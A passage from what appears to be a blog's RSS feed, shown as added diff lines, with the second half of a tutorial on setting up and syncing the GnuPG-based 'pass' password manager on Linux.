+I chose a key-size of 4096, which is the highest possible. Then put in 0 for a everlasting key, confirm you choice. and STOP!<img data-attachment-id="141" data-permalink="https://demgeeks.com/quick-tip-gnupg-based-password-manager/screenshot-2016-12-27-at-18-27-40/" data-orig-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.27.40.png?fit=657%2C520&amp;ssl=1" data-orig-size="657,520" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2016-12-27 at 18.27.40" data-image-description="" data-medium-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.27.40.png?fit=300%2C237&amp;ssl=1" data-large-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.27.40.png?fit=640%2C507&amp;ssl=1" class="aligncenter wp-image-141 size-full" src="https://i0.wp.com/www.demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.27.40.png?resize=640%2C507&#038;ssl=1" alt="setup gpg key" srcset="https://i0.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.27.40.png?w=657&amp;ssl=1 657w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.27.40.png?resize=300%2C237&amp;ssl=1 300w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>Now put a YouTube video playing, setup a file copy from and to your disk for 10 minutes or something. Then go back to your console and it will have asked for a password and fill in you name, email and a comment (like &#8216;created on 27/12/2016&#8217;). Confirm and you are done.<br />
+You can close your YouTube video and the file transfer. This is to generate some computer noise. Which will enprove the randomness of the generated key!</p>
+<p>To test if the key was successfully created:</p>
+<pre>gpg --list-keys</pre>
+<p><img data-attachment-id="142" data-permalink="https://demgeeks.com/quick-tip-gnupg-based-password-manager/screenshot-2016-12-27-at-18-29-25/" data-orig-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.29.25.png?fit=832%2C193&amp;ssl=1" data-orig-size="832,193" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2016-12-27 at 18.29.25" data-image-description="" data-medium-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.29.25.png?fit=300%2C70&amp;ssl=1" data-large-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.29.25.png?fit=640%2C148&amp;ssl=1" class="aligncenter wp-image-142 size-full" src="https://i1.wp.com/www.demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.29.25.png?resize=640%2C148&#038;ssl=1" alt="List keys" srcset="https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.29.25.png?w=832&amp;ssl=1 832w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.29.25.png?resize=300%2C70&amp;ssl=1 300w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.29.25.png?resize=768%2C178&amp;ssl=1 768w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>Ok great!, let us now get pass setup, you can do that with this command: (where the &lt;id&gt; value is your email or name you just put in)</p>
+<pre>pass init &lt;id&gt;</pre>
+<p><img data-attachment-id="143" data-permalink="https://demgeeks.com/quick-tip-gnupg-based-password-manager/screenshot-2016-12-27-at-18-30-29/" data-orig-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.30.29.png?fit=826%2C75&amp;ssl=1" data-orig-size="826,75" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2016-12-27 at 18.30.29" data-image-description="" data-medium-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.30.29.png?fit=300%2C27&amp;ssl=1" data-large-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.30.29.png?fit=640%2C58&amp;ssl=1" class="aligncenter wp-image-143 size-full" src="https://i1.wp.com/www.demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.30.29.png?resize=640%2C58&#038;ssl=1" alt="Init password store" srcset="https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.30.29.png?w=826&amp;ssl=1 826w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.30.29.png?resize=300%2C27&amp;ssl=1 300w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2016/12/Screenshot-2016-12-27-at-18.30.29.png?resize=768%2C70&amp;ssl=1 768w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>Setup done!</p>
+<h2>Usage</h2>
+<p><strong>To insert a password in your password-store:</strong></p>
+<pre>pass insert stuffathome/thingseverybodyshouldknow/wifipassword</pre>
+<p>You can keep adding or removing &#8216;/&#8217; signs to make more divisions in your password-store.<br />
+These will just be added as descending folders.</p>
+<p>To have it instead generate a password for you (if you want to be extra safe) and store it in an encrypted file:</p>
+<pre>pass generate stuffathome/thingseverybodyshouldknow/wifipassword</pre>
+<p><strong>No password asked? Isn&#8217;t this unsafe?</strong><br />
+The way we encrypted this password-store is asymmetrical&#8230; so everybody can encrypt, but only the ones with a private key can decrypt.</p>
+<p><strong>To list the available passwords just type:</strong></p>
+<pre>pass show</pre>
+<p><strong>To retrieve the password we just created, do:</strong></p>
+<pre>pass show stuffathome/thingseverybodyshouldknow/wifipassword</pre>
+<p>And now it will ask for your passphrase of the gpg key you specified in the setup command. Then it should echo the password out. And thats really all you need to know to use this password manager. The key will be available for a small time until it timed out. That&#8217;s it!</p>
+<h2>Syncing your passwords</h2>
+<p>To synchronize your password manager between devices. You need to synchronize 2 sets of files. The first one is you gpg key. Those are stored in the folder ~/.gnupg by default. You can change the location where GnuPG checks for these files with setting the $GNUPGHOME variable:</p>
+<pre>export GNUPGHOME="~/keys"</pre>
+<p>Now you can move your .gnupg folder to a new location and put the new location in this variable. REMINDER: you have to put this command in your ~/.bashrc file or alias it with your pass command (more on that later).</p>
+<p>You passwords are stored in a directory, called a store, this is the one that pass has setup for you. The default location is ~/.password-store. If you use change the variables $PASSWORD_STORE_DIR and $PASSWORDS_STORE_GIT to the location where your store is. So all this in one command (put this in ~/.bashrc):</p>
+<pre>alias pass='GNUPGHOME=~/keys PASSWORD_STORE_DIR=~/DATA/PASSWORDS PASSWORD_STORE_GIT=~/DATA/PASSWORDS pass'</pre>
+<p>This <a href="https://www.demgeeks.com/qt-make-the-command-line-easier-with-aliases-and-functions/">alias</a> command, will make your pass command always use these variables. You copy the passwords-store and key to a service like Dropbox or in a synced git-repository, put the path to these directories in the command and you are set! Please keep the key and password-store seperate, it is still protected by a passphrase but you lose the protection of you 4096-bit key.</p>
+<p>That&#8217;s it! Good Luck with your password manager!</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/quick-tip-gnupg-based-password-manager/">Quick Tip: GnuPG-based password manager (Linux)</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>https://demgeeks.com/quick-tip-gnupg-based-password-manager/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">134</post-id>	</item>
+	</channel>
+</rss>
+
+<!-- Performance optimized by W3 Total Cache. Learn more: https://www.w3-edge.com/products/
+
+Object Caching 6116/6225 objects using disk
+Page Caching using disk: enhanced
+Minified using disk
+Database Caching using disk
+
+ Served from: demgeeks.com @ 2017-12-09 12:26:15 by W3 Total Cache -->
